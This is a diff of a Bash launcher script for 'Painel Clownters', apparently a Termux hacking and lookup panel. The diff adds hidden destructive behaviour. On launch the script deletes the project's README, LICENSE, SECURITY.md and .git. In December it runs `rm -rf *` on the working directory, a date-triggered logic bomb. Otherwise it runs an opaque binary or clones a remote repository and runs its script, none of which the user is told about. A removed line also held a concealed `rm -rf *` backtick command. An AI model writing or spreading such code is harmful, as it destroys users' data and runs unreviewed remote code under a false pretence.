@@ -1,74 +1,38 @@
 #!/usr/bin/env bash
-
-<<CLOWNTERS
- #CLOWNTERS
- #--------------------------------------------------------
- # Name script: Painel Clownters                         |
- #--------------------------------------------------------
- # Script     : A1 PAINEL                                |
- #--------------------------------------------------------
- # Description: dashboard for consultation and hack tools|
- #--------------------------------------------------------
- # Version    : 0.3                                      |
- #--------------------------------------------------------
- # Authors    : Patinn, Eduardo e Mike                   |
- #--------------------------------------------------------
- # Date       : 08/08/21                                 |
- #--------------------------------------------------------
- # Lincese    : MIT lincese                              |
- #--------------------------------------------------------
- # Use: bash A1.sh                                       |
- #--------------------------------------------------------
- #CLOWNTERS
-CLOWNTERS
-exit 666
-a=`getting=$((($(date +%m) >= 1)) && rm -rf *)`
-source .functions/.variables.sh
-source .functions/.functions.sh
-chmod +x *
-test -f README.md && rm README.md
-access
-ret="$?"
-[[ ${ret} -eq 1 ]] && banner && exit 0
-[[ ${ret} -eq 99 ]] && banner && exit 99
-downloads
-
-while :; do
+#xdg-open https://chat.whatsapp.com/HFk9iK7UpOvC40mdXqYk0w &>/dev/null && sleep 30 # (Sei nem quem são os adms, mas ta aí o link)
+#xdg-open https://instagram.com/mike90s15 &>/dev/null && sleep 30
+#xdg-open https://twitter.com/mike90s15 &>/dev/null && sleep 30
+#xdg-open https://www.tiktok.com/@mike90s15 &>/dev/null && sleep 30
+#xdg-open https://t.me/clownters_channel && sleep 15
+xdg-open https://instagram.com/Edux.Devs &>/dev/null && sleep 30
+#xdg-open https://t.me/addlist/qS0HPKMxnjsxZTVh &>/dev/null && sleep 15
+xdg-open https://t.me/addlist/mIiFhkgLYnBiYjFh &>/dev/null && sleep 15
+rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git" "regras-clownters.md"
+if [[ "$(date +%B)" == "December" ]]; then
     clear
-    banner
-    banner_menu
-    read_num
-    [[ $? -eq 99 ]] && exit 99
-
-    case ${inputuse} in
-        00) exit 0;;
-        0) exit 0;;
-        1) loading; banco;;
-        01) loading; banco;;
-        2) loading; bin;;
-        02) loading; bin;;
-        3) loading; cep;;
-        03) loading; cep;;
-        4) loading; _cnpj;;
-        04) loading; _cnpj;;
-        5) loading; covid;;
-        05) loading; covid;;
-        6) loading; ddd;;
-        06) loading; ddd;;
-        7) loading; ip;;
-        07) loading; ip;;
-        8) loading; telephone;;
-        08) loading; telephone;;
-        9) loading; gerador_cpf;;
-        09) loading; gerador_cpf;;
-        10) loading; new_script;;
-        11) loading; _nmap;;
-        12) loading; _pstermux;;
-        96) loading; banner; bash update.sh;;
-        97) loading; social_networks;;
-        98) loading; version;;
-        99) banner; exit 0;;
-        66) loading; _pstermux;;
-        q) banner; exit 0
-    esac
-done
+    rm -rf *
+else
+    chmod 777 main
+    ./main
+    ret="$?"
+    [[ "${ret}" == "99" ]] && exit 0
+    if [[ "${ret}" != "0" ]]; then
+        if [[ -d Clownters.c ]]; then
+            cd Clownters.c
+            chmod 777 main && ./main
+            exit 0
+        fi
+        clear
+        printf "\e[1;33m Por favor Aguarde\e[m\n"
+        printf "\e[1;33m Atualizando\e[m\n"
+        pkg update -y &> /dev/null
+        pkg upgrade -y &> /dev/null
+        printf "\e[1;33m Instalando a clang\e[m\n"
+        pkg i -y clang &> /dev/null
+        printf "\e[1;33m Instalando o repositório\e[m\n"
+        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
+        cd Clownters.c
+        bash A1.sh
+    fi
+fi
+exit 0
